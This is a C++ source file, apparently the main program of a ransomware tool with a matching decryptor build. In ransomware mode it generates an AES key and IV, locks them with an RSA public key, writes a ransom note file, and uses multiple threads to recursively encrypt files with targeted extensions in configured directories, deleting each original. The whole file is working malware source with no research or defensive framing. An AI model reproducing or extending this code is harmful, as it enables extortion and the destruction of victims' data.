#include <atomic>
#include <condition_variable>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <queue>
#include <string>
#include <thread>
#include "config.h"
#include "crypto.h"
#include "cryptopp/cryptlib.h"
#include "utils.h"

namespace fs = std::filesystem;

CryptoPP::SecByteBlock key, iv;

void worker(std::queue<std::filesystem::directory_entry>& data,
            std::mutex& m,
            std::condition_variable& cv,
            std::atomic<bool>& finished) {
  uint64_t files_count = 0;
  while (true) {
    std::unique_lock<std::mutex> lck{m};
#if (DEBUG)
    std::stringstream msg;
    msg << "Thread #" << std::this_thread::get_id() << ": ";
#endif
    cv.wait(lck, [&] { return !data.empty() || finished; });
    if (finished && data.empty()) {
#if (DEBUG)
      msg << files_count << " files proccesed" << std::endl;
      std::cout << msg.str();
#endif
      break;
    }
    files_count++;
    auto dir = data.front();
    data.pop();
    lck.unlock();
    cv.notify_all();
#if (DEBUG)
    msg << dir.path().filename() << std::endl;
    std::cout << msg.str();
#endif

    std::string inputFilename = dir.path().generic_string();
    std::string outputFilename =
        BUILD_RANSOMWARE
            ? inputFilename + ENCRYPTED_FILE_EXTENSION
            : (dir.path().parent_path() / dir.path().stem()).generic_string();
    auto ifile = std::ifstream(inputFilename, std::ios::binary);
    auto ofile =
        std::ofstream(outputFilename, std::ios::binary | std::ios::trunc);

#if (BUILD_RANSOMWARE)
    encrypt(key, iv, ifile, ofile);
#else
    decrypt(key, iv, ifile, ofile);
#endif
    ifile.close();
    ofile.close();
#if (BUILD_RANSOMWARE)
    fs::remove(dir.path());
#endif
  }
}

int getNumThreads() {
  if (NUM_THREADS_AUTO) {
    return std::thread::hardware_concurrency();
  } else {
    return NUM_THREADS;
  }
}

int main(int argc, char* argv[]) {
  int num_threads = getNumThreads();
  std::string encKeyIV;

#if (BUILD_RANSOMWARE)
  auto publicKey = loadPublicKey();
  genKeyIV(key, iv);
  std::string plainKeyIV = hexEncode(key) + ":" + hexEncode(iv);
  rsaEncrypt(publicKey, plainKeyIV, encKeyIV);
  saveRamsonFile(encKeyIV);
#if (DEBUG)
  std::cout << "Generated Key: " << hexEncode(key) << std::endl;
  std::cout << "Generated IV: " << hexEncode(iv) << std::endl;
  std::cout << "Encrypted Key: " << hexEncode(encKeyIV) << std::endl;
#endif
#else
  auto privateKey = loadPrivateKey();
  const std::string KEYS_FILENAME = DECRYPTOR_KEY_FILENAME;
  std::string recoveredKey, recoveredIV;

  if (fs::exists(KEYS_FILENAME)) {
    std::ifstream file(KEYS_FILENAME);
    if (file.is_open()) {
      std::getline(file, encKeyIV);
      file.close();
    }
  } else if (argc == 3 && std::string(argv[1]) == "-key") {
    encKeyIV = std::string(argv[2]);
  } else {
    std::cerr << "No key provided" << std::endl;
    return EXIT_FAILURE;
  }
  recoverKeyIV(privateKey, encKeyIV, recoveredKey, recoveredIV);
  auto decKey = hexDecode(recoveredKey);
  auto decIV = hexDecode(recoveredIV);
  key.Assign((CryptoPP::byte*)decKey.data(), decKey.size());
  iv.Assign((CryptoPP::byte*)decIV.data(), decIV.size());
#endif

  std::queue<std::filesystem::directory_entry> data;
  std::mutex mtx;
  std::condition_variable cv;
  std::atomic<bool> finished = false;

  std::vector<std::thread> threads;

  for (int i = 0; i < num_threads; i++) {
    threads.push_back(std::thread(worker, std::ref(data), std::ref(mtx),
                                  std::ref(cv), std::ref(finished)));
  }

  fs::path paths_to_search[] = DIRS_TO_SEARCH;
  uint64_t files_count = 0;
  uint64_t bytes_count = 0;

  for (const auto& path : paths_to_search) {
    if (fs::exists(path)) {
      auto directory_options =
          fs::directory_options(fs::directory_options::skip_permission_denied);
      auto directory_iterator =
          fs::recursive_directory_iterator(path, directory_options);

      try {
        for (auto const& dir : directory_iterator) {
          if (!dir.is_directory()) {
            auto is_file = dir.is_regular_file();

            if (is_file && checkExtension(dir)) {
              bytes_count += dir.file_size();
              files_count++;
#if (DEBUG)
              std::stringstream msg;
              msg << "Main Thread #" << std::this_thread::get_id() << ": "
                  << dir.path().filename() << std::endl;
              std::cout << msg.str();
#endif
              data.push(dir);
              cv.notify_all();
            }
          }
        }
      } catch (const std::exception& e) {
        std::cerr << e.what() << std::endl;
      }
    }
  }

  finished = true;
  cv.notify_all();

  for (auto& t : threads) {
    t.join();
  }
#if (DEBUG)
  std::cout << "Files count: " << files_count << std::endl;
  std::cout << "Bytes count: " << bytes_count << std::endl;
#endif
  return EXIT_SUCCESS;
}
